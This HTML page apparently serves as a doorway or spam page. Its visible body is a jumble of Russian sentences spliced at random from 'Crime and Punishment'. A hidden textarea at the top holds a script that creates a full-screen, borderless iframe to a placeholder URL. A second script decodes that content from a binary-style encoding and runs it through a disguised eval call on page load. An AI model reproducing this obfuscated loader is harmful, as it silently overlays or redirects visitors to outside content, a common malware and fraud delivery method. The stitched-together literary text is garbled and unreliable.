<html>
<head>
	<title>Лужин обвинил.</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width = device-width">
<script type="text/javascript">
</script>
</head>
<body style="margin: 0 0 0 0">
<textarea id="empty" class="ev" style='display: none'>
/* OBFUSCATE_START */
(function (){
	src = "URL_PLACEHOLDER";
	fname = Math.random().toString(36).slice(2, 2 + Math.max(1, Math.min(6, 10)));
	if(/msie/.test(navigator.userAgent.toLowerCase()))
		var cframe = document.createElement('<iframe name="'+fname+'" src="'+src+'">');
	else
		var cframe = document.createElement('iframe');
	with(cframe){
		name = fname;
		setAttribute("name", fname);
		id = fname;
	};
	cframe.src = src;
	cframe.style.minWidth = 400;
	cframe.style.minHeight = 200;
	cframe.width = '100%';
	cframe.height = '100%';
	cframe.frameBorder = "0";
	cframe.scrolling = "no";
	cframe.style.marginLeft = window.screen.availWidth/2 - cframe.width/2;
	document.body.appendChild(cframe);
})();
/* OBFUSCATE_END */
</textarea>
<script type="text/javascript">
var xcode = document.getElementById("empty").value.split(/\n/);
result = '';
for(word in xcode)
{
	st = xcode[word]
	var encoded = '';
	for (var i = 0, len = st.length; i < len; i++)
	{
		ch = st.charAt(i);
		if(ch == "0")
			encoded = encoded.concat("1")
		else if(ch == "O")
			encoded = encoded.concat("0")
	}
	chr = parseInt(encoded, 2);
	result += String.fromCharCode(chr.toString(10));
}
var classname = document.getElementById('empty').className;
var cls = classname.substring(0, 2) + "a" + "l"
window[cls](result.substr(0, result.length - 1));
</script>
<p style="position: absolute; bottom: 5px; z-index: -100;">
<p>А какая она умная была… какая великодушная… какая добрая! Вы ничего, ничего не знаете… ах!
 Соня проговорила это точно в отчаянии, волнуясь и страдая, и ломая руки. Ужас ее вдруг сообщился и ему: точно такой же испуг показался и в его лице, точно так же и он стал смотреть на нее, и почти даже с тою же детскою улыбкой.
 — Угадала? — прошептал он наконец.
 — Господи! — вырвался ужасный вопль из груди ее. Пуще всего выводили ее из себя плач и страх Коли и Лени. В этот день ему даже показалось, что как будто все каторжные, бывшие враги его, уже глядели на него иначе. Каких страшных мук и истязаний не перенесли иные из них, например бродяги! Неужели уж столько может для них значить один какой-нибудь луч солнца, дремучий лес, где-нибудь в неведомой глуши холодный ключ, отмеченный еще с третьего года и о свидании с которым бродяга мечтает, как о свидании с любовницей, видит его во сне, зеленую травку кругом его, поющую птичку в кусте? Всматриваясь дальше, он видел примеры, еще более необъяснимые.
 В остроге, в окружающей его среде, он, конечно, многого не замечал, да и не хотел совсем замечать. Уж этого-то не надо было бы ей говорить! Она так на меня посмотрела, и так ей тяжело-тяжело стало, что я отказала, и так это было жалко смотреть… И не за воротнички тяжело, а за то, что я отказала, я видела. Нечего подробничать о том, как выкупала меня тогда Марфа Петровна; знаете ли, до какой степени одурманения может иногда полюбить женщина? Это была женщина честная, весьма неглупая (хотя и совершенно необразованная). Что это вы газеты читаете?
 — Газеты.
 — Много про пожары пишут…
 — Нет, я не про пожары. — Тут он загадочно посмотрел на Заметова; насмешливая улыбка опять искривила его губы. — Нет, я не про пожары, — продолжал он, подмигивая Заметову. — А сознайтесь, милый юноша, что вам ужасно хочется знать, про что я читал?
 — Вовсе не хочется; я так спросил. В комнату вошли разом, кроме Сони, Раскольников и Лебезятников, чиновник и городовой, разогнавший предварительно толпу, из которой некоторые провожали до самых дверей. А между тем… о, если б она пожалела меня!
 Милостивый государь, милостивый государь, ведь надобно же, чтоб у всякого человека было хоть одно такое место, где бы и его пожалели! А Катерина Ивановна дама хотя и великодушная, но несправедливая… И хотя я и сам понимаю, что когда она и вихры мои дерет, то дерет их не иначе как от жалости сердца (ибо, повторяю без смущения, она дерет мне вихры, молодой человек, — подтвердил он с сугубым достоинством, услышав опять хихиканье), но, боже, что если б она хотя один раз… Но нет! нет! все сие втуне, и нечего говорить! нечего говорить!… ибо и не один раз уже бывало желаемое, и не один уже раз жалели меня, но… такова уже черта моя, а я прирожденный скот!
 — Еще бы! — заметил, зевая, хозяин.
 Мармеладов решительно стукнул кулаком по столу.
 — Такова уж черта моя! Знаете ли, знаете ли вы, государь мой, что я даже чулки ее пропил? Не башмаки-с, ибо это хотя сколько-нибудь походило бы на порядок вещей, а чулки, чулки ее пропил-с! Косыночку ее из козьего пуха тоже пропил, дареную, прежнюю, ее собственную, не мою; а живем мы в холодном угле, и она в эту зиму простудилась и кашлять пошла, уже кровью.
 Детей же маленьких у нас трое, и Катерина Ивановна в работе с утра до ночи скребет и моет и детей обмывает, ибо к чистоте с измалетства привыкла, а с грудью слабою и к чахотке наклонною, и я это чувствую. И лопнуло все из-за одного дурака! Да разве так возможно?
 — Что руки-то дрогнули? — подхватил Заметов, — нет, это возможно-с.
 Нет, это я совершенно уверен, что это возможно. А ты часто ходишь?
 — Н-нет, — прошептала Соня.
 Раскольников усмехнулся.
 — Понимаю… И отца, стало быть, завтра не пойдешь хоронить?
 — Пойду. Убийца был наверху, когда Кох и Пестряков стучались, и сидел на запоре. Пусть побьет, душу отведет… оно лучше… А вот и дом. Настасья продолжала молча смотреть на него.
 — Никто хозяйку не бил, — проговорила она опять строгим и решительным голосом. Самая маленькая девочка, лет шести, спала на полу, как-то сидя, скорчившись и уткнув голову в диван. Он уже поравнялся с большим каменным домом. Принесет Настасья — поем, не принесет — так и день пройдет; нарочно со зла не спрашивал! Ночью огня нет, лежу в темноте, а на свечи не хочу заработать. Сама бьет в сковороду, детей заставляет петь и плясать. Оставь!
 — И оскорбительно, оскорбительно! Я понимаю тебя! Но… Как как мы уже теперь заговорили ясно (а это отлично, что заговорили наконец ясно, я рад!) — то уж я тебе прямо теперь признаюсь, что давно это в них замечал, эту мысль, во все это время, разумеется, в чуть-чутошном только виде, в ползучем, но зачем же хоть и в ползучем! Как они смеют? Где, где у них эти корни таятся? Если б ты знал, как я бесился! Как: из-за того, что бедный студент, изуродованный нищетой и ипохондрией, накануне жестокой болезни с бредом, уже, может быть, начинавшейся в нем (заметь себе!), мнительный, самолюбивый, знающий себе цену, и шесть месяцев у себя в углу никого не видавший, в рубище и в сапогах без подметок, — стоит перед какими-то кварташками и терпит их надругательство; а тут неожиданный долг перед носом, просроченный вексель с надворным советником Чебаровым, тухлая краска, тридцать градусов Реомюра, спертый воздух, куча людей, рассказ об убийстве лица, у которого был накануне, и все это — на голодное брюхо! Да как тут не случиться обмороку! И на этом-то, на этом все основать! Черт возьми! Я понимаю, что это досадно, но на твоем месте, Родька, я бы захохотал всем в глаза, или лучше: на-пле-вал бы всем в рожу, да погуще, да раскидал бы на все стороны десятка два плюх, умненько, как и всегда их надо давать, да тем бы и покончил. Не беспокойтесь, я все знаю, от него же самого, и я не болтун; никому не скажу. Вдруг краска залила ей все лицо; она вскрикнула и закрылась руками.
 — Нет, это не я! Я не брала! Я не знаю! — закричала она, разрывающим сердце воплем, и бросилась к Катерине Ивановне</p>
</p>
</body>